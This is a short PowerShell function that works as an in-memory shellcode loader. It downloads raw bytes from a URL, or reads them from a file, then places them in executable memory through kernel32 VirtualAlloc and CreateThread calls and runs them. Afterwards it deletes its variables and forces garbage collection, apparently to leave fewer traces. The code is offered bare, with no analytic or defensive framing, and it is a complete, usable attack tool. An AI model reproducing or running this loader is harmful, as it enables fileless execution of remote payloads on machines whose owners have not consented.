function Invoke-InMemorySC {
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$TargetPath
    )
    
    # Memory loading technique
    $memLoad = {
        param($b)
        $mDef = @"
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, IntPtr t);
        [DllImport("kernel32")]
        public static extern uint WaitForSingleObject(IntPtr h, uint t);
"@
        $k32 = Add-Type -MemberDefinition $mDef -Name 'K32' -Namespace 'Win32' -PassThru
        
        $m = $k32::VirtualAlloc([IntPtr]::Zero, [uint]$b.Length, 0x3000, 0x40)
        [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $m, $b.Length)
        $h = $k32::CreateThread([IntPtr]::Zero, 0, $m, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        $k32::WaitForSingleObject($h, [uint32]"0xFFFFFFFF") | Out-Null
    }

    # Download/load logic
    try {
        if ($TargetPath -match '^(http|https)://') {
            $b = (New-Object Net.WebClient).DownloadData($TargetPath)
        }
        else {
            $b = [IO.File]::ReadAllBytes($TargetPath)
        }
        
        # Execute in separate scope
        & $memLoad -b $b
    }
    finally {
        # Cleanup
        Remove-Variable b, memLoad -ErrorAction SilentlyContinue
        [GC]::Collect()
    }
}
